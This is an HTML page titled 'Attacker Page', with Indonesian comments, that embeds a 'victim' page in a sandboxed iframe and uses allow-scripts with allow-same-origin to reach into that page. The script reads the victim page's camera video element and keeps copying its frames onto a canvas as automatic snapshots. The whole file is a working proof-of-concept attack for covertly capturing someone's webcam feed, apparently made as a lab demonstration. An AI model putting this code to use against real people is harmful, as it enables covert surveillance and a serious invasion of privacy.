<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Attacker Page</title>
<style>
  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
  iframe { width: 320px; height: 240px; border: 2px solid black; }
  canvas { display: block; margin-top: 20px; border: 1px solid black; }
</style>
</head>
<body>

<h2>Attacker Page</h2>
<p>Viewer: hanya menampilkan kamera Victim + snapshot otomatis</p>

<iframe id="victimFrame" src="victim.html" sandbox="allow-scripts allow-same-origin allow-forms allow-camera"></iframe>
<canvas id="snapshotCanvas"></canvas>

<script>
const iframe = document.getElementById("victimFrame");
const canvas = document.getElementById("snapshotCanvas");
const ctx = canvas.getContext("2d");

iframe.onload = () => {
  const victimWin = iframe.contentWindow;
  const victimDoc = victimWin.document;
  const video = victimDoc.getElementById("video");

  // Update canvas secara berkala dengan frame video
  const updateCanvas = () => {
    if (video && video.srcObject) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    }
    requestAnimationFrame(updateCanvas);
  };
  updateCanvas();
};
</script>

</body>
</html>
